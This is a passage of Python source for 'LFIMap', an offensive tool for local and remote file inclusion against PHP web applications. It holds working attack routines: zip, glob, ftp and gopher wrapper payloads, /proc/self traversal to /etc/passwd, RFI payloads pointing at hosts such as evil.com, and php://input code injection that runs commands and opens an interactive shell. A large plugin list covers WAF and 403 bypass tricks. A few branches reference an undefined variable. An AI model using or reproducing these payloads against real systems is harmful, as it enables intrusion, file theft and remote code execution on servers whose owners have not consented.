            f"zip:///var/www/html/{dummy_zip_file}%23index.php",
            f"zip:///var/www/html/{dummy_zip_file}%23../etc/passwd", # Path traversal inside zip
        ]

        print_info(f"Testing ZIP wrapper payloads. Note: This assumes a ZIP file exists or can be uploaded.")

        for payload in paths_to_test:
            print_info(f"Testing ZIP wrapper payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)

            if response and response.status_code == 200:
                # Look for indicators that a file from a zip was included
                # This is hard to detect generically without knowing the zip content.
                # We'll look for common file contents or error messages.
                found, indicator_type = self._check_lfi_indicators(response.text)
                if found:
                    print_success(f"ZIP Wrapper LFI likely successful! Content/error detected with payload: [green]{payload}[/]")
                    print_info("Response snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- ZIP Wrapper LFI: {payload} ---\n")
                            out_f.write(response.text + "\n\n")
                    if not self.args.all:
                        print_info("Stopping ZIP Wrapper scan after first hit (use --all to continue).")
                        return
                elif "zip error" in response.text.lower() or "failed to open zip" in response.text.lower():
                    print_warning(f"ZIP Wrapper payload {payload} returned 200 OK, but with a ZIP-related error. This indicates the wrapper is active.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"ZIP Wrapper payload {payload} returned status code: {response.status_code}")
        
        print_info("ZIP Wrapper scan finished.")

    def run_wrapper_glob(self):
        """
        Attempts LFI using the glob:// wrapper for directory listing.
        PHP specific.
        """
        print_info("Starting GLOB Wrapper (glob://) Scan...")
        
        # The glob:// wrapper allows reading directory contents matching a pattern.
        # Example: glob:///var/www/*
        
        # Common directories to list
        directories_to_list = [
            "/var/www/*",
            "/etc/*",
            "/tmp/*",
            "/var/log/*",
            "C:/Windows/*", # For Windows if glob is supported
            "C:/Program Files/*",
        ]

        print_info(f"Testing GLOB wrapper payloads for directory listing.")

        for directory_pattern in directories_to_list:
            payload = f"glob://{directory_pattern}"
            print_info(f"Testing GLOB wrapper payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)

            if response and response.status_code == 200:
                # Look for indicators of directory listing (e.g., file names, directory structures)
                # This is heuristic.
                if "php" in response.text.lower() or ".conf" in response.text.lower() or ".log" in response.text.lower() or "index." in response.text.lower():
                    print_success(f"GLOB Wrapper LFI likely successful! Directory content detected with payload: [green]{payload}[/]")
                    print_info("Response snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- GLOB Wrapper LFI: {payload} ---\n")
                            out_f.write(response.text + "\n\n")
                    if not self.args.all:
                        print_info("Stopping GLOB Wrapper scan after first hit (use --all to continue).")
                        return
                elif "glob error" in response.text.lower() or "no matching files" in response.text.lower():
                    print_warning(f"GLOB Wrapper payload {payload} returned 200 OK, but with a GLOB-related error. This indicates the wrapper is active.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"GLOB Wrapper payload {payload} returned status code: {response.status_code}")
        
        print_info("GLOB Wrapper scan finished.")

    def run_proc_symlink(self):
        """
        Attempts LFI via /proc/self/fd/X symlinks and /proc/self/cwd/....
        Unix only.
        """
        print_info("Starting /proc/self/fd/X and /proc/self/cwd/ LFI Attack...")
        
        if self.args.os == "windows":
            print_warning("/proc/self/fd/X and /proc/self/cwd/ are Unix-like specific paths. This method is unlikely to work on Windows.")
            if not self.args.ignore_server_error:
                return

        # Test /proc/self/fd/X (file descriptors)
        print_info("Testing /proc/self/fd/X (file descriptor) payloads...")
        for fd in range(0, 10): # Common file descriptors
            payload = f"../../../../proc/self/fd/{fd}"
            print_info(f"Testing payload: [yellow]{payload}[/]")
            found, content = self.test_lfi_payload(payload, method=self.args.method_type, data=self.args.post_data)
            if found:
                print_success(f"/proc/self/fd/X LFI confirmed with payload: [green]{payload}[/]")
                if self.args.output:
                    with open(self.args.output, 'a') as f:
                        f.write(f"--- /proc/self/fd/X LFI Found: {payload} ---\n")
                        f.write(content + "\n\n")
                if not self.args.all:
                    print_info("Stopping /proc/self/fd/X scan after first hit (use --all to continue).")
                    return

        # Test /proc/self/cwd/ (current working directory)
        print_info("Testing /proc/self/cwd/ (current working directory) payloads...")
        # Try to traverse from CWD to /etc/passwd or other common files
        cwd_paths = [
            "../../../../proc/self/cwd/../../../../etc/passwd",
            "../../../../proc/self/cwd/../../../../etc/hosts",
            # Add more variations if needed
        ]
        for path in cwd_paths:
            print_info(f"Testing payload: [yellow]{path}[/]")
            found, content = self.test_lfi_payload(path, method=self.args.method_type, data=self.args.post_data)
            if found:
                print_success(f"/proc/self/cwd/ LFI confirmed with payload: [green]{path}[/]")
                if self.args.output:
                    with open(self.args.output, 'a') as f:
                        f.write(f"--- /proc/self/cwd/ LFI Found: {path} ---\n")
                        f.write(content + "\n\n")
                if not self.args.all:
                    print_info("Stopping /proc/self/cwd/ scan after first hit (use --all to continue).")
                    return
        
        print_info("/proc/self/fd/X and /proc/self/cwd/ scan finished.")

    def run_rfi(self):
        """
        Attempts Remote File Inclusion (RFI) using common external URLs.
        PHP specific, requires allow_url_include and allow_url_fopen.
        """
        print_info("Starting RFI (Remote File Inclusion) Attack...")
        
        if self.args.os == "windows":
            print_warning("RFI is more commonly exploited on Unix-like PHP servers. This method might not work on Windows.")

        # Common RFI test payloads (external URLs pointing to a simple PHP shell or indicator)
        # In a real scenario, you'd host these on your own server.
        # For this tool, we'll use a dummy URL.
        rfi_test_urls = [
            "http://example.com/rfi_test.txt", # Simple text file
            "http://example.com/rfi_shell.php", # Simple PHP shell
            "http://evil.com/shell.txt", # Another dummy
        ]
        
        # Add the injection string for RFI, typically for command execution
        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param

        print_info(f"Testing RFI payloads. Note: This requires the target to be able to fetch external URLs.")

        for external_url in rfi_test_urls:
            # For RFI, the payload IS the external URL
            payload = external_url
            print_info(f"Testing RFI payload: [yellow]{payload}[/]")
            
            # If the injection string is meant to be part of the RFI, append it to the URL
            # This assumes the remote file processes it.
            if "<?php" in injection_string: # If it's a PHP shell, append cmd_param
                 test_payload_with_cmd = f"{payload}?{cmd_param}={quote('id')}" # Test with a simple command
                 print_info(f"Testing RFI with command: [yellow]{test_payload_with_cmd}[/]")
                 response = self._make_request(test_payload_with_cmd, method=self.args.method_type, data=self.args.post_data)
            else:
                 response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)

            if response and response.status_code == 200:
                # Look for indicators of successful RFI (e.g., content from the external URL, command output)
                if "id" in response.text or "uid=" in response.text or "whoami" in response.text.lower():
                    print_success(f"RFI confirmed! Remote content/command execution detected with payload: [green]{payload}[/]")
                    print_info("Response snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- RFI Found: {payload} ---\n")
                            out_f.write(response.text + "\n\n")
                    # Offer interactive shell if command execution is likely
                    self._interactive_shell(payload, cmd_param)
                    if not self.args.all:
                        print_info("Stopping RFI scan after first hit (use --all to continue).")
                        return
                else:
                    print_warning(f"RFI payload {payload} returned 200 OK, but no expected RFI indicators found. 'allow_url_include' or 'allow_url_fopen' might be disabled.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"RFI payload {payload} returned status code: {response.status_code}")
        
        print_info("RFI scan finished.")

    def run_wrapper_phpinput(self):
        """
        Attempts LFI using php://input wrapper to include user-supplied POST data.
        Requires allow_url_include to be enabled.
        """
        print_info("Starting php://input Wrapper Scan...")
        
        # This method requires sending the malicious PHP code in the POST body.
        # The LFI payload itself will be "php://input".
        
        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param
        
        payload = "php://input"
        # The actual code to be included is sent in the POST data
        post_data_for_injection = injection_string

        print_info(f"Testing php://input payload: [yellow]{payload}[/]")
        print_info(f"Injecting POST data: [yellow]{post_data_for_injection}[/]")

        response = self._make_request(
            payload, 
            method='POST', # Must be POST for php://input
            data=post_data_for_injection
        )

        if response and response.status_code == 200:
            # Look for indicators of successful code execution from the injected POST data
            if "system" in response.text or "php" in response.text or "eval" in response.text:
                print_success(f"php://input LFI successful! Injected code appears to be processed.")
                print_info(f"You can now try to execute commands. Example: [yellow]{self.url.replace('FUZZ', requests.utils.quote(payload))}&{cmd_param}=id[/]")
                
                if self.args.command:
                    print_info(f"Attempting to execute command: '[yellow]{self.args.command}[/]'")
                    command_payload = f"{requests.utils.quote(payload)}&{cmd_param}={requests.utils.quote(self.args.command)}"
                    command_response = self._make_request(
                        command_payload, 
                        method='POST', 
                        data=post_data_for_injection # Still send the injection string
                    )
                    if command_response and command_response.status_code == 200:
                        print_success(f"Command '{self.args.command}' executed successfully. Output:")
                        console.print(command_response.text)
                        if self.args.output:
                            with open(self.args.output, 'a') as f:
                                f.write(f"--- php://input Command Output: {self.args.command} ---\n")
                                f.write(command_response.text + "\n\n")
                        # Offer interactive shell
                        self._interactive_shell(requests.utils.quote(payload), cmd_param)
                    else:
                        print_error(f"Command execution failed. Status: {command_response.status_code if command_response else 'N/A'}")
            else:
                print_warning(f"php://input payload returned 200 OK, but injected code not found or not executed. 'allow_url_include' might be disabled or input is filtered.")
                if self.args.verbose:
                    print_info("Full response (verbose):")
                    console.print(response.text)
        elif response:
            print_warning(f"php://input payload returned status code: {response.status_code}")
        else:
            print_error("php://input request failed or returned no response.")
        
        print_info("php://input wrapper scan finished.")

    def run_wrapper_ftp(self):
        """
        Attempts LFI using the ftp:// wrapper.
        Requires allow_url_fopen and allow_url_include to be enabled.
        """
        print_info("Starting FTP Wrapper (ftp://) Scan...")
        
        # This method attempts to include a file from an FTP server.
        # In a real scenario, you'd host a malicious file on your own FTP server.
        # For this tool, we'll use a dummy FTP server and file.
        
        dummy_ftp_url = "ftp://user:pass@ftp.example.com/path/to/file.txt"
        
        # Common files to test with ftp://
        ftp_files_to_test = [
            dummy_ftp_url,
            "ftp://anonymous:anon@ftp.example.com/pub/file.txt",
            "ftp://user:password@127.0.0.1/etc/passwd", # Local FTP server
        ]

        print_info(f"Testing FTP wrapper payloads. Note: This requires the target to be able to connect to an FTP server.")

        for payload in ftp_files_to_test:
            print_info(f"Testing FTP wrapper payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)

            if response and response.status_code == 200:
                found, indicator_type = self._check_lfi_indicators(response.text)
                if found:
                    print_success(f"FTP Wrapper LFI confirmed with payload: [green]{payload}[/] (Content Found)")
                    print_info("Content snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- FTP Wrapper LFI: {payload} ---\n")
                            out_f.write(content + "\n\n")
                    if not self.args.all:
                        print_info("Stopping FTP Wrapper scan after first hit (use --all to continue).")
                        return
                elif "ftp error" in response.text.lower() or "failed to connect to ftp" in response.text.lower():
                    print_warning(f"FTP Wrapper payload {payload} returned 200 OK, but with an FTP-related error. This indicates the wrapper is active.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"FTP Wrapper payload {payload} returned status code: {response.status_code}")
        
        print_info("FTP Wrapper scan finished.")

    def run_wrapper_gopher(self):
        """
        Attempts LFI using the gopher:// wrapper.
        Highly versatile, can interact with various services.
        Requires allow_url_fopen and allow_url_include to be enabled.
        """
        print_info("Starting Gopher Wrapper (gopher://) Scan...")
        
        # Gopher is powerful for SSRF and can be used for LFI if combined with
        # other protocols or services.
        # Example: gopher://127.0.0.1:80/_GET%20/index.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A
        
        # We'll test a basic HTTP GET request via Gopher to localhost.
        # This assumes a web server is running on localhost (127.0.0.1:80).
        
        # Payload to fetch /etc/passwd via Gopher to a local HTTP server
        # This is a very specific scenario.
        gopher_payload_http_get_passwd = (
            "gopher://127.0.0.1:80/_" +
            quote("GET /../../../../etc/passwd HTTP/1.1\r\n") +
            quote("Host: localhost\r\n") +
            quote("Connection: close\r\n\r\n")
        )

        # Another example: fetching a local file directly (if Gopher supports direct file access)
        gopher_payload_local_file = "gopher://127.0.0.1:12345/file.txt" # Dummy port/file

        gopher_payloads_to_test = [
            gopher_payload_http_get_passwd,
            gopher_payload_local_file,
        ]

        print_info(f"Testing Gopher wrapper payloads. Note: This wrapper is highly versatile and complex.")

        for payload in gopher_payloads_to_test:
            print_info(f"Testing Gopher wrapper payload: [yellow]{payload}[/]")
            response = self._make_request(payload, method=self.args.method_type, data=self.args.post_data)

            if response and response.status_code == 200:
                found, indicator_type = self._check_lfi_indicators(response.text)
                if found:
                    print_success(f"Gopher Wrapper LFI confirmed with payload: [green]{payload}[/] (Content Found)")
                    print_info("Content snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    if self.args.output:
                        with open(self.args.output, 'a') as out_f:
                            out_f.write(f"--- Gopher Wrapper LFI: {payload} ---\n")
                            out_f.write(content + "\n\n")
                    if not self.args.all:
                        print_info("Stopping Gopher Wrapper scan after first hit (use --all to continue).")
                        return
                elif "gopher error" in response.text.lower() or "failed to connect to gopher" in response.text.lower():
                    print_warning(f"Gopher Wrapper payload {payload} returned 200 OK, but with a Gopher-related error. This indicates the wrapper is active.")
                    if self.args.verbose:
                        print_info("Full response content (verbose):")
                        console.print(response.text)
            elif response:
                print_warning(f"Gopher Wrapper payload {payload} returned status code: {response.status_code}")
        
        print_info("Gopher Wrapper scan finished.")

    def run_race_condition_lfi(self):
        """
        Attempts Race Condition LFI.
        This is a complex technique requiring precise timing and concurrency.
        This implementation provides a conceptual attempt but may not be reliable
        without true multi-threading/asynchronous requests.
        """
        print_info("Starting Race Condition LFI Attack...")
        print_warning("Note: Race Condition LFI is highly dependent on server timing and concurrency. This implementation is conceptual and may not reliably exploit real-world vulnerabilities.")

        # The idea is to upload a temporary file (e.g., via PHP upload vulnerability)
        # and then immediately include it via LFI before it's deleted or processed.
        # This tool does not handle file uploads. We will simulate by trying to
        # include a common temporary file name that *might* be created during a race.

        temp_file_names = [
            "/tmp/php_upload_XXXXXX", # Common PHP temporary file pattern
            "/var/tmp/upload_file_XXXXXX",
            "C:/Windows/Temp/upload_XXXXXX.tmp", # Windows temp file
        ]
        
        # The 'injection_string' would be the content of the temporary file.
        injection_string = self.args.injection_string
        cmd_param = self.args.cmd_param

        # For a true race condition, you'd send many requests concurrently.
        # Here, we'll send a few rapid sequential requests.
        num_attempts = 5
        
        for temp_file_pattern in temp_file_names:
            print_info(f"Attempting to race for temporary file: [yellow]{temp_file_pattern}[/]")
            for i in range(num_attempts):
                # In a real race, another request would be uploading the file here
                # We are just trying to include a *guess* of the temporary file name.
                
                # Generate a plausible temporary filename (e.g., with random suffix)
                # This is a very rough guess.
                temp_file_guess = temp_file_pattern.replace("XXXXXX", ''.join(random.choices('0123456789abcdef', k=6)))
                
                print_info(f"  Attempt {i+1}/{num_attempts}: Including [yellow]{temp_file_guess}[/]")
                response = self._make_request(temp_file_guess, method=self.args.method_type, data=self.args.post_data)

                if response and response.status_code == 200:
                    if injection_string in response.text:
                        print_success(f"Race Condition LFI likely successful! Injected code found in response for {temp_file_guess}.")
                        print_info("Response snippet (first 500 characters):")
                        console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                        
                        # Offer interactive shell
                        self._interactive_shell(temp_file_guess, cmd_param)
                        if not self.args.all:
                            print_info("Stopping Race Condition LFI scan after first hit (use --all to continue).")
                            return
                    else:
                        if self.args.verbose:
                            print_warning(f"Attempt {i+1}: {temp_file_guess} included, but injected string not found.")
                elif response:
                    if self.args.verbose:
                        print_warning(f"Attempt {i+1}: {temp_file_guess} returned status code: {response.status_code}")
                
                # Small delay to simulate some network latency, but still keep it fast for "race"
                time.sleep(0.01) 
        
        print_info("Race Condition LFI scan finished (conceptual attempt).")


    def run_parameter_fuzzing(self):
        """
        Fuzzes common parameter names to identify the vulnerable LFI parameter.
        This method is only called if --fuzz-param is used and --param is NOT used.
        """
        print_info("Starting Parameter Fuzzing...")
        common_params = ["file", "page", "id", "view", "name", "path", "document", "folder", "template", "cat", "dir", "filename"]
        test_payload = "../../../../etc/passwd" # A reliable payload to test for LFI
        
        # Filter parameters based on --skip-param
        params_to_fuzz = [p for p in common_params if p not in self.args.skip_param]

        if not params_to_fuzz:
            print_warning("No parameters to fuzz after considering --skip-param. Skipping parameter fuzzing.")
            return

        found_vulnerable_param = None

        for param in params_to_fuzz:
            print_info(f"Fuzzing parameter: [yellow]{param}[/]")
            
            # Construct a temporary URL for fuzzing this parameter
            fuzz_url = self.url.split('?')[0] # Start with base URL
            
            if self.args.method_type == 'GET':
                # Add the fuzzed parameter to the query string
                fuzz_url += f"?{param}=FUZZ"
                # Preserve original query parameters if any, excluding 'FUZZ'
                original_query_params = self.url.split('?')[1] if '?' in self.url else ''
                if original_query_params:
                    # Remove any existing FUZZ placeholder from original params
                    original_query_params = re.sub(r'[^&]*FUZZ[^&]*', '', original_query_params).strip('&')
                    if original_query_params:
                        fuzz_url += f"&{original_query_params}"
                
                temp_lfi_tool = LFITool(fuzz_url, self.args) # Pass the constructed URL
                found, content = temp_lfi_tool.test_lfi_payload(test_payload, method='GET') # Always GET for URL param fuzzing
            
            elif self.args.method_type == 'POST':
                # For POST, we need to construct the post_data for the fuzzed parameter
                fuzz_post_data = f"{param}=FUZZ"
                temp_lfi_tool = LFITool(self.url, self.args) # Use original URL, but pass new post_data
                found, content = temp_lfi_tool.test_lfi_payload(test_payload, method='POST', data=fuzz_post_data)
            else:
                continue # Should not happen with current method_type choices

            if found:
                print_success(f"Vulnerable parameter found: [green]{param}[/]")
                found_vulnerable_param = param
                # Update the main tool's URL/post_data to use this found parameter
                if self.args.method_type == 'GET':
                    self.url = fuzz_url # Update the main instance's URL
                elif self.args.method_type == 'POST':
                    self.args.post_data = fuzz_post_data # Update the main instance's post_data
                
                print_info(f"Updated target for subsequent scans: [yellow]{self.url if self.args.method_type == 'GET' else self.args.post_data}[/]")
                break
            else:
                print_warning(f"Parameter '[yellow]{param}[/]' does not appear vulnerable.")
        
        if not found_vulnerable_param:
            print_error("No vulnerable parameter found among common names. You might need to specify it manually or use a custom wordlist.")
            sys.exit(1) # Exit if no vulnerable parameter found and fuzzing was requested

# --- Main Function ---
def main():
    """
    Parses command-line arguments and initiates the LFIMap tool.
    """
    parser = argparse.ArgumentParser(
        description="LFIMap: A Powerful LFI Exploitation Tool\n"
                    "Use 'FUZZ' as a placeholder in the URL or --post-data for the LFI payload.",
        formatter_class=argparse.RawTextHelpFormatter
    )

    # Create a mutually exclusive group for wizard mode, direct execution, and info flags
    main_operation_group = parser.add_mutually_exclusive_group()

    main_operation_group.add_argument(
        "-u", "--url",
        help="Target URL with 'FUZZ' placeholder for LFI payload (e.g., http://example.com/index.php?file=FUZZ)"
    )
    
    main_operation_group.add_argument(
        "-f", "--load-file",
        help="Load target URLs from a file (one URL per line). Overrides -u/--url."
    )

    main_operation_group.add_argument(
        "--wizard",
        action="store_true",
        help="Start an interactive wizard to guide beginner users through the scan setup."
    )

    # New dependency check/list flags (mutually exclusive with main operations)
    info_group = parser.add_mutually_exclusive_group()
    info_group.add_argument(
        "-D", "--check-depends",
        action="store_true",
        help="Check if all required dependencies are installed and warn about optional ones."
    )
    info_group.add_argument(
        "-d", "--list-depends",
        action="store_true",
        help="List all required and optional dependencies and their installation status."
    )

    # Create a mutually exclusive group for -m and -T
    method_group = parser.add_mutually_exclusive_group()
    
    # Method selection (old)
    method_group.add_argument(
        "-m", "--method",
        choices=["basic", "php-filter", "log-poisoning", "session-poisoning", "proc-self-environ", "data-uri", "timing-based", "exec-wrapper", "file-wrapper", "wrapper-phar", "wrapper-zip", "wrapper-glob", "proc-symlink", "rfi", "wrapper-phpinput", "wrapper-ftp", "wrapper-gopher", "race-condition-lfi", "all"],
        help="LFI exploitation method to use:\n"
             "  basic: Common file path enumeration.\n"
             "  php-filter: PHP filter bypass (e.g., base64 encoding).\n"
             "  log-poisoning: Inject code into log files via User-Agent.\n"
             "  session-poisoning: Inject code into PHP session files.\n"
             "  proc-self-environ: Inject code into /proc/self/environ via User-Agent.\n"
             "  data-uri: Use data:// URI scheme to embed code.\n"
             "  timing-based: Detect blind LFI by measuring response time delays.\n"
             "  exec-wrapper: Use PHP expect:// wrapper for command execution.\n"
             "  file-wrapper: Use file:/// wrapper to access local files.\n"
             "  wrapper-phar: Test phar:// for object injection via LFI.\n"
             "  wrapper-zip: Test zip:// read on vulnerable zip packages.\n"
             "  wrapper-glob: Use glob:// for directory listing (PHP specific).\n"
             "  proc-symlink: Try LFI via /proc/self/fd/X symlinks and /proc/self/cwd/....\n"
             "  rfi: Remote File Inclusion (PHP Only).\n"
             "  wrapper-phpinput: Include user input from POST data via php://input.\n"
             "  wrapper-ftp: Use ftp:// wrapper to include files from FTP servers.\n"
             "  wrapper-gopher: Use gopher:// wrapper for versatile protocol interaction.\n"
             "  race-condition-lfi: Attempt LFI via race conditions with temporary files.\n"
             "  all: Run all available methods (default)."
    )

    # New technique selection
    method_group.add_argument(
        "-T", "--technique",
        choices=["basic", "php-filter", "log-poisoning", "session-poisoning", "proc-self-environ", "data-uri", "timing-based", "exec-wrapper", "file-wrapper", "wrapper-phar", "wrapper-zip", "wrapper-glob", "proc-symlink", "rfi", "wrapper-phpinput", "wrapper-ftp", "wrapper-gopher", "race-condition-lfi", "all"],
        help="LFI exploitation technique to use (alias for -m/--method):\n"
             "  basic: Common file path enumeration.\n"
             "  php-filter: PHP filter bypass (e.g., base64 encoding).\n"
             "  log-poisoning: Inject code into log files via User-Agent.\n"
             "  session-poisoning: Inject code into PHP session files.\n"
             "  proc-self-environ: Inject code into /proc/self/environ via User-Agent.\n"
             "  data-uri: Use data:// URI scheme to embed code.\n"
             "  timing-based: Detect blind LFI by measuring response time delays.\n"
             "  exec-wrapper: Use PHP expect:// wrapper for command execution.\n"
             "  file-wrapper: Use file:/// wrapper to access local files.\n"
             "  wrapper-phar: Test phar:// for object injection via LFI.\n"
             "  wrapper-zip: Test zip:// read on vulnerable zip packages.\n"
             "  wrapper-glob: Use glob:// for directory listing (PHP specific).\n"
             "  proc-symlink: Try LFI via /proc/self/fd/X symlinks and /proc/self/cwd/....\n"
             "  rfi: Remote File Inclusion (PHP Only).\n"
             "  wrapper-phpinput: Include user input from POST data via php://input.\n"
             "  wrapper-ftp: Use ftp:// wrapper to include files from FTP servers.\n"
             "  wrapper-gopher: Use gopher:// wrapper for versatile protocol interaction.\n"
             "  race-condition-lfi: Attempt LFI via race conditions with temporary files.\n"
             "  all: Run all available methods (default)."
    )
    
    # General options
    parser.add_argument(
        "--method-type",
        choices=["GET", "POST"],
        default="GET",
        help="HTTP method to use for requests (default: GET)."
    )
    parser.add_argument(
        "--post-data",
        help="Data for POST requests. Use 'FUZZ' as a placeholder for the LFI payload.\n"
             "Example: 'param1=value1&file=FUZZ&param2=value2'."
    )
    parser.add_argument(
        "-w", "--wordlist",
        help="Path to a wordlist file for basic LFI enumeration (e.g., common_paths.txt)."
    )
    parser.add_argument(
        "-o", "--output",
        help="File to save successful LFI findings and command outputs."
    )
    parser.add_argument(
        "--proxy",
        help="HTTP/S proxy (e.g., http://127.0.0.1:8080)."
    )
    parser.add_argument(
        "--user-agent",
        help="Custom User-Agent string."
    )
    parser.add_argument(
        "--mobile",
        action="store_true",
        help="Use a common mobile User-Agent string to simulate a mobile device."
    )
    parser.add_argument(
        "--browser-user-agent",
        choices=list(USER_AGENTS.keys()),
        help="Specify a browser type (chrome, firefox, brave, safari, opera) to use a random User-Agent for that browser."
    )
    parser.add_argument(
        "--cookies",
        help="Custom cookies (e.g., 'PHPSESSID=abc; user=admin'). Separate with ';'."
    )
    parser.add_argument(
        "--headers",
        help="Custom headers (e.g., 'X-Forwarded-For:127.0.0.1;Referer:example.com'). Separate with ';'."
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)."
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=3,
        help="Number of retries for failed HTTP requests (default: 3)."
    )
    parser.add_argument(
        "--no-ssl-verify",
        action="store_true",
        help="Disable SSL certificate verification."
    )
    parser.add_argument(
        "--all",
        action="store_true",
        help="Continue scanning with all payloads/methods even after a successful hit (for selected method)."
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose output (request/response dumps, debug info)."
    )
    parser.add_argument(
        "--ignore-server-error", 
        action="store_true",
        help="Continue scanning even if server errors (e.g., 4xx, 5xx, timeouts) or connection issues occur." 
    )
    parser.add_argument(
        "--os",
        choices=["unix", "osx/macos", "windows"],
        help="Specify the target operating system to use OS-specific LFI payloads."
    )
    parser.add_argument(
        "-eT", "--exclude-technique",
        nargs='*', # Allows zero or more arguments
        choices=["basic", "php-filter", "log-poisoning", "session-poisoning", "proc-self-environ", "data-uri", "timing-based", "exec-wrapper", "file-wrapper", "wrapper-phar", "wrapper-zip", "wrapper-glob", "proc-symlink", "rfi", "wrapper-phpinput", "wrapper-ftp", "wrapper-gopher", "race-condition-lfi"],
        help="Specify one or more techniques to exclude from the scan (e.g., basic php-filter)."
    )
    parser.add_argument(
        "--ignore-set-cookie",
        action="store_true",
        help="Do not process 'Set-Cookie' headers from responses. Effectively prevents session tracking by the server."
    )
    parser.add_argument(
        "--ignore-redirects",
        action="store_true",
        help="Do not follow HTTP redirects (e.g., 301, 302)."
    )
    parser.add_argument(
        "--referer",
        help="Set a custom 'Referer' header for all requests."
    )
    parser.add_argument(
        "-p", "--param",
        help="Specify a single parameter to test for LFI. This overrides 'FUZZ' in URL/POST data and parameter fuzzing."
    )
    parser.add_argument(
        "-sp", "--skip-param",
        nargs='*', # Allows zero or more arguments
        help="Specify one or more parameters to skip during fuzzing (e.g., 'param1 param2')."
    )
    parser.add_argument(
        "--http-version",
        choices=["1.0", "1.1", "2"],
        default="1.1",
        help="Specify HTTP protocol version (1.0, 1.1, 2). Note: HTTP/2 is not natively supported by 'requests' library."
    )

    # New plugin options
    plugin_group = parser.add_argument_group("Plugin Options")
    plugin_group.add_argument(
        "--plugin",
        nargs='*',
        choices=["403", "xforwardedfor", "questionmark", "doubleslash2slash", "unicodetrick", "spoofhost-header",
                 "extra-dot", "semicolon-injection", "path-normalization", "base64-in-path", "case-variation", "multi-encoding", "iis-double-slash",
                 "wrapper-phar", "wrapper-zip", "wrapper-glob", "wrapper-data", "proc-symlink", "session-id-bruteforce", "exfil-data", "race-condition-lfi",
                 "waf-detection", "lfi-error-fingerprint", "mimetype-check",
                 "tab-trick", "comment-trick", "dotdot-trick", "fat-dot", "utf7-bypass", "clrf-injection", "rate-limit-adapter"],
        help="Enable specific plugins for advanced bypasses:\n"
             "  403: Attempt various 403 Forbidden bypass techniques.\n"
             "  xforwardedfor: Add X-Forwarded-For: 127.0.0.1 header.\n"
             "  questionmark: Append '??' to payload (Unix only, basic LFI).\n"
             "  doubleslash2slash: Convert backslashes to forward slashes (Windows only).\n"
             "  unicodetrick: Apply basic Unicode encoding tricks to payload (e.g., overlong UTF-8 for slashes).\n"
             "  spoofhost-header: Spoof Host header to 'localhost'.\n"
             "  extra-dot: Adds trailing dot to path (/etc/passwd.) to bypass filters.\n"
             "  semicolon-injection: Appends ;.php or ;.txt to trick path validators.\n"
             "  path-normalization: Uses /./ or /.././ to evade normalization.\n"
             "  base64-in-path: Base64-encode parts of path (e.g., L2V0Yy9wYXNzd2Q=) if server decodes.\n"
             "  case-variation: Variants like /EtC/PaSsWd to bypass case-sensitive filters.\n"
             "  multi-encoding: Applies double/triple encoding (..%%252f..%%252f) to beat WAFs.\n"
             "  iis-double-slash: Adds // to the path (IIS Only) to bypass filters.\n"
             "  wrapper-phar: Test phar:// for object injection via LFI.\n"
             "  wrapper-zip: Test zip:// read on vulnerable zip packages.\n"
             "  wrapper-glob: Use glob:// for directory listing (PHP specific).\n"
             "  wrapper-data: Inject raw data via data:// and test inclusion.\n"
             "  proc-symlink: Try LFI via /proc/self/fd/X symlinks and /proc/self/cwd/....\n"
             "  session-id-bruteforce: Bruteforce PHPSESSID (combined with session poisoning).\n"
             "  exfil-data: Attempts basic data exfiltration after LFI (e.g., print content).\n"
             "  race-condition-lfi: Attempts LFI via race conditions with temporary files (conceptual).\n"
             "  waf-detection: Identifies common WAFs via headers and responses (e.g., Cloudflare, Sucuri).\n"
             "  lfi-error-fingerprint: Looks for LFI indicators in HTML response (e.g., open_basedir, include() errors).\n"
             "  mimetype-check: Tests if file inclusion results in MIME/content-type hints.\n"
             "  tab-trick: Injects a %%09 (tab character) to trick extension checks.\n"
             "  comment-trick: Inserts /* style comments in traversal path (e.g., /etc/*/passwd).\n"
             "  dotdot-trick: Inserts double .. in traversal (e.g., /....//etc/passwd).\n"
             "  fat-dot: Adds %%e2%%80%%ae (right-to-left override) to obfuscate filenames.\n"
             "  utf7-bypass: Attempts UTF-7 payloads (+ADw-script+AD4) for weird charset misconfigs.\n"
             "  clrf-injection: Injects CRLF characters into headers (e.g., User-Agent) for various bypasses.\n"
             "  rate-limit-adapter: Adds a small delay between requests to bypass simple rate limiting."
    )
    plugin_group.add_argument(
        "--list-plugins",
        action="store_true",
        help="List all available plugins and their descriptions."
    )

    # Authentication options
    auth_group = parser.add_argument_group("Authentication Options")
    auth_group.add_argument(
        "--auth-user",
        help="Username for authentication."
    )
    auth_group.add_argument(
        "--auth-pass",
        help="Password for authentication."
    )
